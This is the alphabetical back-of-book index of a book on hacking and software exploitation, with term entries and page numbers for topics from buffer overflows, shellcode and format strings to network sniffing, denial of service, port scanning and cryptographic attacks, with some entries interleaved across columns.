of\nvalue, 16–17 injected shellcode, 190\nheap variable, 76 table sections for, 184–188\n458 INDEX\ndtors_sample.c program, 184 ESI (Source Index) register, 24\ndump() function, 204 ESP (Stack Pointer) register, 24, 33,\ndup2 system call, 307 70, 73\nDWORD (double word), 29 shellcode and, 367\nconverting to quadword, 302 /etc/passwd file, 89, 153\n/etc/services file, default ports in,\nE 207–208\nETHERhdr structure, 245–246\nEAX (Accumulator) register, 24,\nEthernet, 218, 230\n312,346\nheader for, 230\nzeroing, 368\nlength of, 231\nEBP (Base Pointer) register, 24, 31,\nEuclidean algorithm, 400–401\n70, 73, 344–345\nextended, 401–402\nsaving current values, 342\nEuler’s totient function, 400, 403\nEBX (Base) register, 24, 312, 344–345\nexamine command (GDB)\nsaving current values, 342\nfor ASCII table lookup, 34–35\nec_malloc() function, 91 to display disassembled\nECX (Counter) register, 24\ninstructions, 30\nEDI (Destination Index) register, 24\ndisplay unit size for, 28–29\nEDX (Data) register, 24, 361\nfor memory, 27–28\nEFLAGS register, 25\nexclamation point (!), 14\nEIP register. See Instruction Pointer\nexecl() function, 149, 389, 390\n(EIP) register\nexecle() function, 149\nelegance, 2, 6\nexec_shell.c program, 296\nencapsulation, 196\nexec_shell.s program, 297\nencoded_sockreuserestore_dbg.s file,\nexecutable binaries, 21\n360–361\ncreating from assembly code, 286\nencryption, 393\nexecute permission, 87\nasymmetric, 400–405\nexecution flow, controlling, 118\nmaximum allowable key size in\nexecution of arbitrary code, 118\nexported software, 394\nexecve() function, 295–296, 388–389\nsymmetric, 398–400\nstructure for, 298\nwireless 802.11b, 433–436\nexhaustive brute-force attacks,\nenv command, 142 422–423\nenvironment variables, 142\nexit, automatically executing\ndisplaying location, 146\nfunctionon, 184\nfor exploiting, 148\nexit() function, 191, 286\nPATH, 172\naddress of, 192\nplacing shellcode in, 188\nexploit buffer, 332\nrandomization of stack\nexploit programs, 329\nlocation,380\nexploit scripts, 328–333\nfor storing string, 378\nexploit tools, 329\nepoch, 97\nexploitation, 115\nequal to operator (==), 14\nwith BASH, 133–150\nerror checking, for malloc(), 79, 80–81\nbuffer overflows, 119–133\nerrorchecked_heap.c program, 80–81\nformat strings, 167–193\nerrors, off-by-one, 116–117\ndirect parameter access,\nescape sequences, 48\n180–182\nescaped character, backslash (\\)\nreading from arbitrary memory\nfor,180\naddresses, 172\nINDEX 459\nexploitation, continued fingerprints\nformat strings, continued fuzzy, 413–417\nwith short writes, 182–183 host, for SSH, 410–413\nvulnerability, 170–171 firewalls, and port-binding\nwriting to arbitrary memory shellcode,314\naddresses, 173–179 first-in, last-out (FILO) ordering, 70\ngeneral techniques, 118 firstprog.c program, 19\nheap-based overflow, 150–155 float data type, 12, 13, 43\njackpot() function as target, flood services, by DoS attacks, 251\n160–166 flow of execution, operations\noverflowing function pointers, controlling, 26\n156–167 Fluhrer, Mantin, and Shamir (FMS)\noverwriting global offset table, attack, 439–449\n190–193 fms.c program, 443–445\nwithout log file, 352–354 fmt_strings.c program, 48–49\nexploit_notesearch.c program, 121 fmt_uncommon.c program, 168\nexploit_notesearch_env.c program, fmt_vuln.c program, 170–171\n149–150 fopen() function, 419\nextended Euclidian algorithm, for loops, 10–11\n401–402 with assembly instructions, 309–310\nto fill buffer, 138\nF foreground (fg) command, 158, 332\nfatal errors, displaying, 228 forging source address, 239\nfatal() function, 83, 91 fork() function, 149, 346\nformat parameters, 48\nfcntl_flags.c program, 85–86\nformat strings, 167–193\nfcntl.h file, 84\nmemory for, 171\nFeistel network, for DES, 399\nFelten, Edward, 3 for printf() function, 48–51\nshort writes for exploits, 182–183\nfencepost error, 116\nffp, 454 simplifying exploits with direct\nfg (foreground) command, 158, 332 parameter access, 180–182\nfgets() function, 419 vulnerability, 170–171\nfield-width option, for format FP (frame pointer), 70\nparameter, 49 fprintf() function, for error\nfile access, in C, 81–86 messages,79\nfraggle attacks, 257\nfile descriptors, 81\nfragmenting packets, 221\nduplicating standard, 307–309\nIPv6, 256\nin Unix, 283\nframe pointer (FP), 70\nFile Not Found HTTP response, 213\nfile permissions, 87–88 free() function, 77, 79, 152\nfree speech, 4\nFile Transfer Protocol (FTP), 222\nserver, 226 FTP (File Transfer Protocol), 222\nfilestreams, 81 server, 226\nFILO (first-in, last-out) ordering, 70 funcptr_example.c program, 100\nfilter, for packets, 259 functionality, expansion, and\nFIN scans, 264–265 errors,117\nafter kernel modification, 268 functions, 16–19\nbefore kernel modification, automatically executing on\nexit,184\n267–268\nbreakpoint in, 24\nfind_jmpesp.c program, 386\n460 INDEX\ndeclaring as void, 17 gethostbyname() function, 210, 211\nfor error checking, 80–81 getuid() function, 89, 92\nlibraries of, 19 Glen, Peter, 454\nlocal variables for, 62 glibc, heap memory management, 152\nmemory, string pointer global offset table (GOT),\nreferencing, 228 overwriting, 190–193\npointers, 100–101 global variables, 63, 64, 75\ncalling without overwriting, 157 memory addresses, 69\noverflowing, 156–167 memory segment for, 69\nprologue, 27, 71, 132 GNU Compiler Collection (GCC), 20.\nsaving current register See also GDB debugger\nvalues,342 compiler, GDB access to source\nprototype, 17 code, 26\nfor string manipulation, 39 objdump program, 21, 184, 185\nfuzzy fingerprints, 413–417 Goldberg, Ian, 394\nGOT (global offset table),\nG overwriting, 190–193\ngreater than operator (>), 14\ngame_of_chance.c program, 102–113,\ngreater than or equal to\n156–167\noperator(>=), 14\ngateway, 241\ngreatest common divisor (GCD), 401\nGCC. See GNU Compiler Collection\nGreece, ancient, 3\n(GCC)\ngrep command, 21, 143–144\nGCD (greatest common divisor), 401\nto find kernel code sending reset\nGDB debugger, 23–24\npackets, 267\naddress-of operator, 45\nGrimes, Mark, 242, 454\nanalysis with, 273–275\ngroups, file permissions for, 87\nto control running tinywebd\nGrover, Lov, 399–400\nprocess, 350–352\nto debug daemon child process,\nH\n330–331\ndisassembly syntax, 25 Hacker Ethic, 2\ndisplaying local variables in stack hacking, 272–280\nframe, 66 analysis with GDB, 273–275\nexamine command attitudes toward, 451\nfor ASCII table lookup, 34–35 and compiled program, 21\nto display disassembled cycle of innovation, 319\ninstructions, 30 essence of, 1–2\nfor memory, 27–28 origins, 2\ninvestigating core with, 289–290 port-binding shellcode, 278–280\ninvestigations with, 380–384 as problem solving, 5\nprint command, 31 and program crash control, 121\nshorthand commands, 28 hacking.h file, adding to, 204\nstepi command, 384 hacking-network.h file, 209–210, 231,\n.gdbinit file, 25 232, 272–273\ngeneral-purpose registers, 24 hacks, 6\nGET command (HTTP), 208 half-open scan, 264\ngetenv() function, 146 handle_connection() function, 216, 342\ngetenvaddr.c program, 147–148, 172 breakpoint in function, 274–275\ngeteuid() function, 89 handle_shutdown() function, 328\nINDEX 461\nhardware addresses, 218 if-then-else structure, 8–9\nhash lookup table, 423–424 in assembly language, 32\nhead command, 143–144 in_addr structure, 203\nHEAD command (HTTP), 208 connection IP address in, 315–316\nheap, 70 inc operation, 25, 36\nallocation function for, 75 include file, for functions, 91\nbuffer overflows in, 150–155 incoming connection\ngrowth of, 75 C function to accept, 199\nmemory allocation, 77 listening for, 316\nvariable incrementing variable values, 13–14\ndeclaring, 76 inet_aton() function, 203\nspace allocated for, 77 inet_ntoa() function, 203, 206\nheap_example.c program, 77–80 info register eip command, 28\nHeisenberg uncertainty principle, 395 information theory, 394–396\n“Hello, world!”, program to print, 19 initialization vector (IV)\nhelloworld1.s program, 287–288 gathering, 449\nhelloworld3.s program, 294 for WEP, 434, 437, 440\nhelloworld.asm program, 285–286 decryption dictionary tables\nhelloworld.c, rewrite in assembly, 285 based on, 438\nHerfurt, Martin, 256 input, length check or\nhexadecimal dump, of standard restrictionon,120\nshellcode, 368 input size, for algorithm, 397\nhexadecimal notation, 21 input validation, 365\nhigh-level languages, conversion to input.c program, 50\nmachine language, 7 input_name() function, 156\nHoltmann, Marcel, 256 Instruction Pointer (EIP) register, 25,\nhost fingerprints, for SSH, 410–413 27, 40, 43, 69, 73\nhost key, retrieving from servers, 414 assembly instructions and, 287\nhost_addr structure, for bind call, 205 crash from attempt to restore, 133\nhostent structure, 210–211 examining memory for, 28\nhost_lookup.c file, 211–212 as pointer, 43\nhtonl() function, 202 program execution and, 69\nhtons() function, 203, 205 shellcode and, 367\nHTTP (Hypertext Transfer Protocol), int data type, 12\n197, 207–208, 222 int instruction, 285\nhybrid ciphers, 406–417 integers, function for converting\nHypertext Transfer Protocol (HTTP), ASCII to, 59\n197, 207–208, 222 Intel syntax for assembly language,\n22, 23, 25\nI Internet Control Message Protocol\n(ICMP), 220–221\nICMP. See Internet Control Message\namplification attacks with\nProtocol (ICMP)\npackets,257\nid command, 88 echo messages, 256\nidle scanning, 265–266\nEcho Request, 221\nIDS (intrusion detection systems),\nInternet Datagram header, 232\n4,354\nInternet Explorer, zero-day VML\nif statement, in BASH, 381 vulnerability, 119\nifconfig command, 316 Internet Information Server\nfor promiscuous mode setting, 224\n(Microsoft IIS), 117\n462 INDEX\nInternet Protocol (IP), 220 L\naddresses, 197, 220\nLaMacchia, David, 118\nconversion, 203\nLaMacchia Loophole, 117–118\ndata-link layer and, 218–219\nLaurie, Adam, 256\nin logs, 348\nLB (local base) pointer, 70\nredirection, 438–439\nlea (Load Effective Address)\nspoofing logged, 348–352\ninstruction, 35, 296\nIDs, predictable, 265\nleast significant byte, 174, 178\nstructure, 231\nleave instruction, 132\ninterrupt 0x80, 285\nless than operator (<), 14\nintrusion detection systems (IDS),\nless than or equal to operator (<=), 14\n4,354\nlibc, returning into, 376–377\nintrusion prevention systems\nlibc function, finding location,\n(IPS),354\n377–378\nintrusions\nlibnet library (C), 244\nlog files and detection, 334–336\ndocumentation for functions,\noverlooking obvious, 336–347\n248–249\nIP. See Internet Protocol (IP)\nrelease, 254\nIPS (intrusion prevention\nstructures, 263\nsystems),354\nlibnet_build_arp() function, 248–249\niptables command, 407\nlibnet_build_ethernet() function, 248\nIPv6 packets, fragmented, 256\nlibnet_close_link_interface()\nIV. See initialization vector (IV)\nfunction,249\nlibnet-config program, 254\nJ\nlibnet_destroy_packet() function, 249\njackpot() function, as exploit target, libnet_get_hwaddr() function, 251\n160–166 libnet_get_ipaddr() function, 251\njle operation, 32, 310 libnet_get_prand() function, 252\njmp esp instruction, 385 libnet_host_lookup() function, 251\npredictable address for, 388 libnet_init_packet() function, 248\njmp short instruction, 292 libnet_open_link_interface()\njobs command, 332 function,248\nJohn the Ripper, 422, 454 libnet_seed_prand() function, 252\njumps in assembly language, 26 libpcap sniffer, 228–230, 235, 260\nconditional, 310 libraries\nunconditional, 36 documentation, 251\nof functions, 19\nLinux environment, 19\nK\nbooting from CD, 4\nKey Scheduling Algorithm (KSA), nonexecutable stack, 376\n435, 440–442 system calls in assembly, 284–286\nkeystream, 398 linux-gate\nreuse, 437–438 bouncing off, 384–388\nkill command, 323, 324 execution jump to, 386\nknowledge, and morality, 4 linux/net.h include file, 304–305\nknown_hosts file, 410 listen() function, 199, 206\nKSA (Key Scheduling Algorithm), little-endian byte order, 29, 93, 316\n435, 440–442\nINDEX 463\nLiveCD, 4, 19 mark_break.s file, 342–343\nJohn the Ripper, 422 mark_restore.s file, 345\nNemesis, 242 mark.s file, 339\n/usr/src/mitm-ssh, 407 mathematics, beauty in, 3\nLoad Effective Address instruction Maxwell, James, 321\n(lea), 35, 296 Media Access Control (MAC)\nlocal base (LB) pointer, 70 addresses, 218\nlocal variables, 62 memcpy() function, 139\ndisplaying in stack frame, 66 memory, 21–22\nmemory addresses, 69 addresses\nmemory saved for, 130 hexadecimal notation for, 21\nlocaltime_r() function, 97 order of, 75\nlog files reading from arbitrary, 172\nexploitation without, 352–354 writing to arbitrary, 173–179\nand intrusion detection, 334–336 allocation for void pointer, 57\nlogic, as art form, 2 corruption, 118\nlong keyword, 42 efficiency, vs. time for coding, 6\nloopback address, 217, 317–318 for format string, 171\nloopback_shell_restore.s file, 346–347 GDB debugger to examine, 27–28\nloopback_shell.s file, 318 instructions to set up, 27\nlooping for local variables, 130\nfor, 10–11 predicting address, 147\nwhile/until, 9–10 segmentation, 69–81, 285\nlseek() function, 95 segments, 60\nLSFR (stream cipher), 398 buffer overflows in, 150–167\nin C, 75–77\nM for variables, 119\nviolation, 60\nMAC (Media Access Control)\nmemory_segments.c program, 75–77\naddresses, 218, 230\nmemset() function, 138\nmachine language, 7\nMicrosoft, IIS webserver, 117\ncontrol structures, 309\nMIT model railroad club, 2\nconverting assembly to, 288\nMitM (man-in-the-middle) attacks,\nviewing for main() function, 21 406–410\nmain() function, 19 mitm-ssh package, 407, 454\ncommand-line argument\nmodulo reduction, 12\naccessin,58\nmorality, and knowledge, 4\ndisassembly of, 27\nmov instruction, 25, 33, 285\nviewing machine code for, 21\nvariations, 292\nmalloc() function, 75, 76, 77, 79\nerror checking for, 80–81\nN\nman page\nfor arpspoof, 249 %n format parameter, 48, 168–169, 173\nfor ASCII, 33–34 nasm assembler, 286, 288, 454\nfor daemon(), 321 Nathan, Jeff, 242, 454\nfor exec(), 388 nc program, 279\nfor libnet, 248, 251 ndisasm tool, 288\nfor write(), 283 negative numbers, 42\nman-in-the-middle (MitM) attacks, Nemesis, 242–248, 454\n406–410\n464 INDEX\nnemesis_arp() function, 245 sockets, 198–217\nnemesis-arp.c file, 244–245 address conversion, 203\nnemesis.h file, 245–246 addresses, 200–202\nnemesis-proto_arp.c file, 246–248 functions, 199–200\nnested function calls, 62 network byte order, 202–203\nnetcat program, 279, 309, 316, 332 server example, 203–207\nnetdb.h file, 210 tinyweb server, 213–217\nnetinet/in.h file, 201–202 web client, 207–213\nnetstat program, 309 TCP/IP hijacking, 258–263\nNetwide Assembler (NASM), 454 RST hijacking, 259–263\nnetwork byte order, 202–203, 316 newline character, for HTTP line\nnetwork layer (OSI), 196, 197 termination, 209\nfor web browser, 217, 220–221 Newsham, Tim, 436–437\nnetwork sniffing, 224–251, 393 nexti (next instruction) command, 31\nactive sniffing, 239–251 NFS (number field sieve), 404\ndecoding layers, 230–239 nm command, 159, 184, 185\nlibpcap sniffer, 228–230 nmap (port scanning tool), 264\nraw socket sniffer, 226–227 No Electronic Theft Act, 118\nnetworking, 195 nonorthogonal quantum states, in\nabnormal traffic detection, photons, 395\n354–359 nonprintable characters, printing, 133\nDenial of Service, 251–258 NOP (no operation) sled, 140, 145,\namplification attacks, 257 275, 317, 332, 390\ndistributed DoS flooding, 258 hiding, 362–363\nping flooding, 257 between loader code and\nping of death, 256 shellcode, 373\nSYN flooding, 252–256 not equal to operator (!=), 14\nteardrop, 256 not operator (!), 14\nhacking, 272–280 notesearch.c program, 93–96\nanalysis with GDB, 273–275 exploitation, 386–387\nport-binding shellcode, 278–280 format string vulnerability,\nnetwork sniffing, 224–251 189–190\nactive sniffing, 239–251 vulnerability to buffer overflow,\ndecoding layers, 230–239 137–142\nlibpcap sniffer, 228–230 notetaker.c program, 91–93, 150–155\nraw socket sniffer, 226–227 note-taking program, 82\nOSI layers for web browser, ntohl() function, 203\n217–224 ntohs() function, 203, 206\ndata-link layer, 218–219 null bytes, 38–39, 290\nnetwork layer, 220–221 and exploit buffer, 335\ntransport layer, 221–224 filling exploit buffer with, 275\nOSI model, 196–198 removing, 290–295\nport scanning, 264–272 NULL pointer, 77\nFIN, X-mas, and null scans, null scans, 264–265\n264–265 number field sieve (NFS), 404\nidle scanning, 265–266 numbers, pseudo-random, 101–102\nproactive defense, 267–272 numerical values, 41–43\nspoofing decoys, 265 Nyberg, Claes, 407, 454\nstealth SYN scan, 264\nINDEX 465\nO pads, 395\npassword file, 153\nO_APPEND access mode, 84\npassword probability matrix, 424–433\nobjdump program, 21, 184, 185\npasswords\nO_CREAT access mode, 84, 87\ncracking, 418–433\noff-by-one error, 116–117\ndictionary attacks, 419–422\none-time pads, 395\nexhaustive brute-force attacks,\none-time password, 258\n422–423\none-way hashing algorithm, for pass-\nhash lookup table, 423–424\nword encryption, 153\nlength of, 422\nopen files, file descriptor to\none-time, 258\nreference, 82\nPATH environment variable, 172\nopen() function, 87, 336–337\npayload smuggling, 359–363\nfile descriptor for, 82\npcalc (programmer’s calculator),\nflags used with, 84\n42,454\nlength of string, 83\npcap libraries, 229\nOpenBSD kernel\npcap_fatal() function, 228\nfragmented IPv6 packets, 256\npcap_lookupdev() function, 228\nnonexecutable stack, 376\npcap_loop() function, 235, 236\nOpenSSH, 116–117\npcap_next() function, 235\nopenssh package, 414\npcap_open_live() function, 229, 261\noptimization, 6\npcap_sniff.c program, 228\nor instruction, 293\npercent sign (%), for format\nOR operator, 14–15\nparameter, 48\nfor file access flags, 84\nPerl, 133\nO_RDONLY access mode, 84\npermissions for files, 87–88\nO_RDWR access mode, 84\nperror() function, 83\nOSI model, 196–198\nphotons, nonorthogonal quantum\nlayers for web browser, 217–224\nstates in, 395\ndata-link layer, 218–219\nphysical layer (OSI), 196, 197\nnetwork layer, 220–221\nfor web browser, 218\ntransport layer, 221–224\npigeonhole principle, 425\nO_TRUNC access mode, 84\nping flooding, 257\noutbound connections, firewalls\nping of death, 256\nand,314\nping utility, 221\noverflow_example.c program, 119\nplaintext, for protocol structure, 208\noverflowing function pointers,\nplay_the_game() function, 156–157\n156–167\nPLT (procedure linkage table), 190\noverflows. See buffer overflows\npointer, to sockaddr structure, 201\nO_WDONLY access mode, 84\npointer arithmetic, 52–53\nowner, of file, 87\npointer variables\ndereferencing, 53\nP\ntypecasting, 52\npacket injection tool, 242–248 pointer.c program, 44\npacket-capturing programs, 224 pointers, 24–25, 43–47\npackets, 196, 198 function, 100–101\ncapturing, 225 to structs, 98\ndecoding layers, 230–239 pointer_types.c program, 52\ninspecting, 359 pointer_types2.c program, 53–54\nsize limitations, 221 pointer_types3.c program, 55\n466 INDEX\npointer_types4.c program, 56 product ciphers, 399\npointer_types5.c program, 57 programming\npolymorphic printable ASCII access to heap, 70\nshellcode, 366–376 as artistic expression, 2\npop instruction, 287 basics, 6–7\nand printable ASCII, 368 control structures, 8–11\npopping, 70 if-then-else, 8–9\nport scanning, 264–272 while/until loops, 9–10\nFIN, X-mas, and null scans, variables, 11–12\n264–265 programs, results from, 116\nidle scanning, 265–266 promiscuous mode, 224\nproactive defense, 267–272 capturing in, 229\nspoofing decoys, 265 pseudo-code, 7, 9\nstealth SYN scan, 264 Pseudo-Random Generation Algo-\nport scanning tool (nmap), 264 rithm (PRGA), 435, 436\nport-binding shellcode, 278–280, pseudo-random numbers, 101–102\n303–314 public key, 400\nports, root privileges for binding, 216 punch cards, 2\nposition-independent code, 286 push instruction, 287, 298\nPowerPC processor architecture, 20 and printable ASCII, 368\nppm_crack.c program, 428–433 pushing, 70\nppm_gen.c program, 426–428 Pythagoreans, 3\npresentation layer (OSI), 196\nPRGA (Pseudo-Random Generation Q\nAlgorithm), 435, 436\nquadword, converting\nprint command (GDB), 31\ndoublewordto,302\nprint error, 83\nquantum factoring algorithm,\nprintable ASCII shellcode,\n404–405\npolymorphic, 366–376\nquantum key distribution, 395–396\nprintable characters, program to\nquantum search algorithm, 399–400\ncalculate, 369\nprintable_helper.c program, 369–370\nquotation marks (\"), for include\nfiles,91\nprintable.s file, 371–372\nprintf() function, 19–20, 35, 37, 47\nR\nformat strings for, 48–51, 167\nprinting nonprintable characters, 133 RainbowCrack, 433\nprint_ip() function, 254 rand() function, 101\nprivate key, 400 rand_example.c program, 101–102\nprivileges, 273, 299 random numbers, 101–102\npriv_shell.s program, 301 randomization, execl() function and,\nprobability, conditional, 114 390, 391\nproblem solving randomized stack space, 379–391\nwith hacking, 1–2 raw socket sniffer, 226–227\nhacking as, 5 raw_tcpsniff.c program, 226–227\nprocedure linkage table (PLT), 190 RC4 (stream cipher), 398, 434,\nprocedure prologue, 71 435–436\nprocess, suspending current, 158 read() function, file descriptor for, 82\nprocess hijacking, 118 read permission, 87\nprocessor, assembly language read-only permission, for text\nspecificity for, 7 segment, 69\nINDEX 467\nRecording Industry Association of spawning, 192\nAmerica (RIAA), 3 spawning with child process, 346\nrecv() function, 199, 206 user, 88\nrecv_line() function, 209, 273, RSA Data Security, 394, 400, 404\n335,342 RST hijacking, 259–263\nredirection attack, 240–241 rst_hijack.c program, 260–263\nregisters, 23, 285, 292 modification, 268\ndisplaying, 24 run time of simple algorithm, 397\nfor x86 processor, 23\nzeroing, with polymorphic S\nshellcode, 366\nrelatively prime numbers, 400 %s format parameter, 48, 172\nSadmind worm, 117\nremainder, after division, 12\nsalt value, 153–154\nremote access, to root shell, 317\nfor password encryption, 419\nremote targets, 321\nSasser worm, 319\nRequest for Comments (RFC)\nsaved frame pointer (SFP), 70,\n768, on UDP header, 224\n72–73,130\n791, on IP headers, 220, 232\nS-box array, 435\n793, on TCP header, 222–223,\n233–234 scanf() function, 50\nscope of variables, 62–69\nret instruction, 132, 287\nscope.c program, 62\nret2libc, 376–377\nscope2.c program, 63–64\nreturn address, 70\nscope3.c program, 64–65\nfinding exact location, 139\nscript kiddies, 3\noverwriting, 135\nSecure Digital Music Initiative\nin stack frame, 131\n(SDMI), 3\nreturn command, 267\nSecure Shell (SSH)\nReturn Material Authorization\ndiffering host fingerprints,\n(RMA), 221\n410–413\nreturn value of function, declaring\nprotections against identity\nfunction with data type of,\nspoofing, 409–410\n16–17\nSecure Sockets Layer (SSL), 393\nRFC. See Request for Comments\nprotections against identity\n(RFC)\nspoofing, 409–410\nRIAA (Recording Industry Associa-\nsecurity\ntion of America), 3\nchanging vulnerabilities, 388\nRieck, Konrad, 413, 454\ncomputational, 396\nRMA (Return Material\nimpact of mistakes, 118\nAuthorization), 221\nunconditional, 394\nRonnick, Jose, 454\nseed number, for random sequence\nroot\nof numbers, 101\nprivileges, 153, 273\nsegmentation fault, 60, 61\nto bind port, 216\nshell to restore, 301\nsemicolon (;), for instruction end, 8\nshell send() function, 199, 206\nobtaining, 188 send_string() function, 209\noverflow to open, 122 seq command, 141\nsequence numbers, for TCP, 222, 224\nremote access, 317\nserver example, displaying packet\nsocket reuse, 355–359\ndata, 204\n468 INDEX\nsession layer (OSI), 196 Simple Mail Transfer Protocol\nfor web browser, 217 (SMTP), 222\nset disassembly intel command, 25 simplenote.c program, 82–84\nset user ID (setuid) permission, 89 simple_server.c file, 204–207\nseteuid() function, 299 sizeof() function, 58\nsetresuid() system call, 300–301 sizeof() macro (C), 42\nsetsockopt() function, 205 Sklyarov, Dmitry, 3–4\nSFP (saved frame pointer), 70 SMTP (Simple Mail Transfer\nShannon, Claude, 394 Protocol), 222\nshell command, executing like smurf attacks, 257\nfunction, 134 sniffing packets\nshellcode, 137, 281 active, 239–251\nargument as placement option, 365 in promiscuous mode, 225\nassembly language for, 282–286 sockaddr structure, 200–202, 305, 306\nconnect-back, 314–318 pointer to, 201\ncreating, 286–295 sockaddr_in structure, 348\njump to, 386 socket() function, 199, 200, 205, 314\nmemcpy() function to copy, 139 socketcall() system call (Linux), 304\nmemory location for, 142 socket_reuse_restore.s file, 357\noverwriting .dtors section with sockets, 198–217, 307\naddress of injected, 190 address conversion, 203\nplacing in environment addresses, 200–202\nvariable,188 file descriptor for accepted\npolymorphic printable ASCII, connection, 206\n366–376 functions, 199–200\nport-binding, 278–280, 303–314 reuse, 355–359\nproof of functioning, 336 server example, 203–207\nreducing size, 298 tinyweb server, 213–217\nrestoring tinyweb daemon web client, 207–213\nexecution, 345 software piracy, 118\nshell-spawning, 295–303 Solar Designer, 422, 454\nand webserver, 332 Song, Dug, 226, 249, 454\nzeroing registers, 294 source address, manipulating, 239\nshellcode.s program, 302–303 Source Index (ESI) register, 24\nShor, Peter, 404–405 Sparc processor, 20\nshort keyword, 42 spoofing, 239–240\nshort writes, for format string logged IP address, 348–352\nexploits, 182–183 packet contents, 263\nshorthand expressions, for arith- sprintf() function, 262\nmetic operators, 13–14 srand() function, 101\nshroud.c program, 268–272 SSH. See Secure Shell (SSH)\nsigint_handler() function, 323 SSL (Secure Sockets Layer), 393\nSIGKILL signal, 324 protections against identity\nsignal() function, 322 spoofing, 409–410\nsignal_example.c program, 322–323 stack, 40, 70, 128\nsignal_handler() function, 323 arguments to function call in, 339\nsignals, for interprocess communica- assembly instructions using,\ntion in Unix, 322–324 287–289\nsigned numerical values, 41\nINDEX 469\nstack, continued strncasecmp() function, 213\nframe, 70, 74, 128 strstr() function, 216\ndisplaying local variables in, 66 structs, 96–100\ninstructions to set up and access to elements, 98\nremove structures, 341 su command, 88\ngrowth of, 75 sub instruction, 293, 294\nmemory in, 77 sub operation, 25\nnonexecutable, 376–379 sudo command, 88, 90\nrandomized space, 379–391 superposition, 399–400\nrole with format strings, 169 suspended process, returning to, 158\nsegment, 70 switched network environment,\nvariables packets in, 239\ndeclaring, 76 symmetric encryption, 398–400\nand shellcode reliability, 356 SYN flags, 223\nStack Pointer (ESP) register, 24, 33, SYN flooding, 252–256\n70, 73 preventing, 255\nshellcode and, 367 SYN scan\nstack_example.c program, 71–75 preventing information leakage\nStallman, Richard, 3 with, 268\nstandard error, 307 stealth, 264\nstandard input, 307, 358 syncookies, 255\nstandard input/output (I/O) synflood.c file, 252–254\nlibrary,19 sys/stat.h file, 84\nstandard output, 307 bit flags defined in, 87\nstatic function memory, string pointer system calls, manual pages for, 283\nreferencing, 228 system daemons, 321–328\nstatic keyword, 75 system() function, 148–149\nstatic variables, 66–69 returning into, 377–379\nmemory addresses, 69\nmemory segment for, 69 T\nstatic.c program, 67\nTCP. See Transmission Control\nstatic2.c program, 68\nProtocol (TCP)\nstatus flags, cmp operation to set, 311\nstderr argument, 79\ntcpdump, 224, 226\nBPFs for, 259\nstdio header file, 19\nsource code for, 230\nstealth, by hackers, 320\nstealth SYN scan, 264 tcphdr structure (Linux), 234\nTCP/IP, 197\nstepi command (GDB), 384\nconnection, telnet to\nstorage space, vs. computational\nwebserver,208\npower, 424\nhijacking, 258–263\nstrace program, 336–338, 352–353\nstack, SYN flood attempt to exhaust\nstrcat() function, 121\nstates, 252\nstrcpy() function, 39–41, 365\nstream ciphers, 398 tcp_v4_send_reset() function, 267\nteardrop, 256\nstream sockets, 198, 222\ntelnet, 207, 222\nstring.h, 39\nto open TCP/IP connection to\nstrings, 38–41\nwebserver, 208\nconcatenation in Perl, 134\nencoding, 359–362 temporary variable, from print\ncommand, 31\nstrlen() function, 83, 121, 209\n470 INDEX\ntext segment, of memory, 69 uid_demo.c program, 90\nthen keyword, 8–9 ulimit command, 289\nth_flags field, of tcphdr structure, 234 uname command, 134\ntime() function, 97 unary operator\ntime_example.c program, 97 address-of operator, 45\ntime_example2.c program, 98–99 dereference operator, 47, 50\ntime_ptr variable, 97 unconditional jumps, in assembly\ntime/space trade-off attack, 424 language, 36\ntimestamp() function, 352 unconditional security, 394\ntiny_shell.s program, 298–299 unencrypted data transmission, 226\ntinyweb.c program Unicode character set, 117\nconverting to system daemon, 321 Unix systems\nas daemon, 324–328 manual pages, 283\nexploit for, 275 signals for interprocess\nvulnerability in, 273 communication, 322–324\ntinywebd.c program, 325–328, 355 time on, 97\nexploit tool, 329–333 unsigned keyword, 42\nlog file, 334 unsigned numerical values, 41\ntinyweb_exploit.c program, 275 integer for pointer address, 57\ntinyweb_exploit2.c program, 278 unswitched network, 224\ntm time struct, 97 until loop, 10\ntranslator, for machine language, 7 update_info.c file, 363–364\nTransmission Control Protocol usage() function, 82\n(TCP), 198, 222 User Datagram Protocol (UDP),\nconnection for remote shell access, 198–199, 222, 224\n308–309 echo packets, amplification attacks\nflags, 222 with, 257\nopening connection, 314 user IDs, 88–96\npacket header, 233–234 displaying notes written by, 93\nsniffing, with raw sockets, 226 setting effective, 299\nstructure, 231 users, file permissions for, 87\ntransport layer (OSI), 196, 197 user-supplied input, length check or\nfor web browser, 217, 221–224 restriction on, 120\nTriple-DES, 399 /usr/include/asm-i386/unistd.h file,\ntwo’s complement, 42, 49 284–285\nto remove null bytes, 291 /usr/include/asm/socket.h file, 205\ntypecasting, 51–58 /usr/include/bits/socket.h file,\nfrom tm struct pointer to integer 200,201\npointer, 98 /usr/include/if_ether.h file, 230\ntypecasting.c program, 51 /usr/include/linux/if_ethernet.h\ntypedef, 245 file, 230\ntypeless pointers, 56 /usr/include/netinet/ip.h file,\ntypes. See data types 230,231–232\n/usr/include/netinet/tcp.h file, 230,\nU 233–234\n/usr/include/stdio.h file, 19\nUDP (User Datagram Protocol),\n/usr/include/sys/sockets.h file, 199\n198–199, 222, 224\n/usr/include/time.h file, 97\necho packets, amplification attacks\n/usr/include/unistd.h file, 284\nwith, 257\n/usr/src/mitm-ssh, 407\nINDEX 471\nV where command, 61\nwhile/until loops, 9–10\nvalues\nWired Equivalent Privacy (WEP), 433,\nassigning to variable, 12\n434–435\nreturned by function, 16\nattacks, 436–449\nvariables, 11–12\nwireless 802.11b encryption, 433–436\narithmetic operators for, 12–14\nword, 28–29\nC compiler and data type, 58\nworms, 119\ncomparison operators for, 14–15\nWozniak, Steve, 3\nscope, 62–69\nWPA wireless protocol, 448\nstructs, 96–100\nwrite() function, 83\ntemporary, from print\nfile descriptor for, 82\ncommand,31\nmanual page for, 283\ntypecasting, 51–58\npointer for, 92\nvoid keyword, 56\nwrite permission, 87\nfor declaring function, 17\nfor text segment, 69\nvoid pointer (C), 56, 57\nvuln.c program, 377\nX\nvulnerabilities\nformat strings, 170–171 %x format parameter, 171, 173\nin software, 451–452 field-width option, 179\nstack-based, 122–133 x/3xw command, 61\nin tinyweb.c program, 273 x86 processor, 20, 23–25\nzero-day VML, 119 assembly instructions for, 285\nxchg (exchange) instruction, 312\nW X-mas scans, 264–265\nxor instruction, 293, 294\nwarnings, about pointer data type, 54\nxtool_tinywebd_reuse.sh script, 358\nweb browser, OSI layers for, 217–224\nxtool_tinywebd.sh script, 333\nweb client, 207–213\nxtool_tinywebd_silent.sh script,\nweb requests, processing after\n353–354\nintrusion, 336\nxtool_tinywebd_spoof.sh 